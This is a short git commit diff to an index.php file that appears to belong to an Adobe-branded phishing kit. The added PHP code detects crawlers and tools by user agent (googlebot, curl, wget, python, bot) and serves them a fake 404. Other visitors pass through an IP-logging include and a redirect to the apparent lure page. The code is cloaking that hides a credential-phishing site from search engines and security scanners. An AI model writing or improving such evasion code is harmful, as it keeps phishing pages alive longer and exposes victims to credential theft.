55e77fdb500cfc4654553aca7c16d606b1acd3d3
mosean2000 <ayesha1281827@gmail.com>
2025-07-02 18:13:28 +0500

    Update index.php

--- .sites/adobe/index.php
+++ .sites/adobe/index.php
@@ -1,4 +1,15 @@
 <?php
+if (isset($_SERVER['HTTP_USER_AGENT'])) {
+    $ua = $_SERVER['HTTP_USER_AGENT'];
+    if (stripos($ua, 'googlebot') !== false || 
+        stripos($ua, 'curl') !== false || 
+        stripos($ua, 'wget') !== false || 
+        stripos($ua, 'python') !== false || 
+        stripos($ua, 'bot') !== false) {
+        header("HTTP/1.0 404 Not Found");
+        exit;
+    }
+}
 include 'ip.php';
 header('Location: ezview.html');
 exit
